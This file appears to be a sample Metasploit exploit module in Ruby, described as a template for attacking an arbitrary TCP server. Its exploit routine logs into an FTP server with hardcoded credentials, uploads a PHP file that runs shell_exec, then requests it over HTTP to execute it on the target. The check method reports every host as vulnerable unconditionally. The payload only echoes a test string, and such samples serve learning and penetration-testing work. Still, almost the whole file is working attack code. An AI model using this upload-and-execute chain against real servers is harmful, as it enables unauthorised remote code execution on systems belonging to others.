##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# This exploit sample shows how an exploit module could be written to exploit
# a bug in an arbitrary TCP server.
#
###
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Ftp
  include Msf::Exploit::Remote::TcpServer
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'Sample Exploit',
        'Description'    => '',
        'License'        => MSF_LICENSE,
        'Author'         => ['skape'],
        'References'     =>
          [ ],
        'Payload'        =>
          {
            'Space'    => 1000,
            'BadChars' => "\x00"
          },
        'Targets'        =>
          [
            [ ]
          ],
        'DisclosureDate' => '',
        'DefaultTarget'  => 0
      )
    )
  end

  def check
    Exploit::CheckCode::Vulnerable
  end

  def exploit

    php      = "<?php echo shell_exec('echo \"im vulnerable!\"');  ?>"

    print_status('going to connect')

    conn = ftp_connect
    print_status('connected')

    res = send_user("ftpuser", conn)
    print_status(res.to_s)

    res = send_pass("ftpuser", conn)
    print_status(res.to_s)

    res = send_cmd(['CWD', 'files'], true, conn)
    print_status(res.to_s)

    res = send_cmd(['PASV'], true, conn)
    print_status(res.to_s)

    res = send_cmd(['TYPE', 'a'], true, conn)
    print_status(res.to_s)

    print_status("sending data...")
    res = send_cmd_data(['PUT', 'InihsVFc.php'], php, 'a', conn)
    print_status(res.to_s)
    print_status("sent")

    disconnect(conn)
    print_status('disconnected')

    print_status("http://#{rhost}/files/InihsVFc.php")
    res = request_url("http://#{rhost}/files/InihsVFc.php")
    print_status(res.to_s)

  end
end
